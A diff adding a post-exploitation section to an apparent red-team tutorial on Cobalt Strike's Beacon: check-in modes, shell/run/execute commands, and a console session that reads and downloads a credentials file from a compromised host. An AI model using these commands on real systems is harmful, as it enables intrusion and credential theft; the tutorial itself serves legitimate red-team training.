@@ -174,3 +174,78 @@ Details of the newly spawned Beacon will be displayed in the Beacon session tabl
 
 
 The visualization of this session can be changed if you wish. To view a Beacon session as a pivot graph, navigate to Cobalt Strike, Visualization, then Pivot Graph, or select the Visualization button in the Cobalt Strike toolbar (highlighted in the image below).
+---------
+POST EXPLOITATION
+--------
+What is post-exploitation?
+Every action that is taken on a compromised system, once an initial foothold has been achieved, falls under the umbrella of post-exploitation activity. Getting onto the target is only half the objective for a red team engagement. Operators are often required to try and move around the network (lateral movement), gain administrative privileges (privilege escalation), or steal valuable information (data exfiltration).
+
+Beacon
+As previously discussed, Beacon is the name given to the default payload used by Cobalt Strike. Through interaction with Beacon, red team operators are able to task the payload to perform post-exploitation activity through the use of commands – just like any terminal-based environment. 
+
+Beacon can communicate with Cobalt Strike through both asynchronous and interactive communication. Asynchronous is a slow but stealthy way of interacting with the Beacon. In asynchronous mode, Beacon calls home periodically, receiving a list of tasks to complete, returning the output of these tasks on its next check-in.
+
+Conversely, when using interactive mode, everything happens in real-time, with no waiting time between check-ins. Commands are run, and output is returned immediately to Cobalt Strike. This is faster, but louder, and can be more easily detected.
+
+Beacon is asynchronous by default, and checks in every 60 seconds. Change the check-in time by using the sleep command, followed by the length of time (in seconds) Beacon should wait. To enter interactive mode, change this time to 0 seconds:
+
+beacon> sleep 0
+Beacon Console
+To interact with a spawned Beacon, right-click on a live Beacon session. Select Interact from the menu to open the Beacon Console.
+
+
+The Beacon Console is the primary user interface for a Beacon session. The console allows users to see what tasks have been sent to a Beacon, as well as the output from these tasks.
+
+
+Here, you can interact with a Beacon the same way you would interact with any command-line environment. Commands such as cd and pwd work as they would on a Linux-based terminal, respectively changing directories and printing the current working directory. 
+
+Running shell commands
+Cobalt Strike offers a number of different methods when executing commands directly on the host. 
+
+The shell command will task Beacon to execute a command using cmd.exe on the target host, comparable to opening a command prompt and entering a command. This is different to the run command, which executes the command without the use of cmd.exe. 
+
+Using both the shell and run commands return output to Cobalt Strike via the Beacon, whereas the third command – execute – runs the command in the background, without any output.
+
+Finally, Cobalt Strike also supports executing commands with PowerShell, through use of the powershell command. 
+
+Each of these methods has its distinct advantages and disadvantages. While shell is the simplest method, cmd.exe is likely heavily monitored and/or restricted when run on enterprise networks. As a result, using the run command may be a better choice during a red team engagement. 
+
+Data exfiltration
+Cobalt Strike allows its operators to exfiltrate data in several ways. Firstly, through the Beacon terminal, it's possible to navigate to a directory, and read a file at the terminal.
+
+beacon> cd C:\Users\admin\Desktop
+[*] cd C:\Users\admin\Desktop
+[+] host called home, sent: 30 bytes
+beacon> shell type credentials.txt
+[*] Tasked beacon to run: type credentials.txt
+[+] host called home, sent: 51 bytes
+[+] received output:
+password1
+Download
+Beacon also includes the download command, downloading files from the compromised host to the team server. 
+
+beacon> download credentials.txt
+[*] Tasked beacon to download credentials.txt
+[+] host called home, sent: 23 bytes
+[*] started download of C:\Users\admin\Desktop\credentials.txt (9 bytes)
+[*] download of credentials.txt is complete
+However, before a downloaded file can be opened on the desktop, you must first sync your desktop with the team server. Select View from the Cobalt Strike menu, and then Downloads.
+
+
+You should be presented with a list of the downloaded files (from all Beacons) currently on the team server. To download a file, select it from the list, and then click on the Sync Files button. Choose a directory from the dialog box, and confirm to add the selected file(s) to your device.
+
+File Browser
+Finally, Cobalt Strike also offers a File Browser option for a user to explore the file structure of the compromised host through a graphical interface, rather than the command line. To open the File Browser, right-click on a Beacon and select Explore, followed by File Browser. 
+
+
+The File Browser will automatically generate the directory structure of the current working directory of the Beacon. By navigating through the directories on the left-hand tree, Cobalt Strike will populate the File Browser with the contents of each directory. 
+
+
+The File Browser allows operators to download files, simply by right-clicking on a file and selecting Download. Similar to Beacon's download command, files must be synchronized before they can be accessed on the desktop. Operators can also copy the contents of the file directly to their clipboard, by right-clicking and selecting Copy.
+
+Other commands
+This is just a small fraction of the commands Cobalt Strike has to offer when using Beacon payloads. For a complete list of all available Beacon commands, you can use the help command. To return detailed help on a specific command, enter help followed by the name of the command, for example, help shell.
+
+
+Cobalt Strike's Beacon is malleable (customizable), meaning that red team operators can create their own profiles and scripts to use with Beacon, infinitely extending the post-exploitation functionality available.
+
